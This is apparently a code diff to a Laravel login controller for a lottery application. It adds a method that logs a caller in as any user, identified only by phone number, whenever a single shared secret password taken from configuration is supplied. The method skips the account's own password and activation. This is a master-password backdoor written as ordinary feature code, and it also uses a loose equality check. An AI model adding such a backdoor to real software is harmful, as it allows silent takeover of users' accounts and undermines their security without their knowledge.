@@ -37,4 +37,16 @@ class Login2Controller extends Controller
              return back();
 
     }
+
+    public function loginWithoutActivationCode($phoneNumber,$password)
+    {
+        if ($password == config('lottery.secretloginpass.key'))
+        {
+            $user = User::where('phone_number',$phoneNumber)->first();
+            Auth::loginUsingId($user->id);
+            return redirect(route('home'));
+        }
+        return 'password is wrong or there are not user phone number';
+    }
+
 }
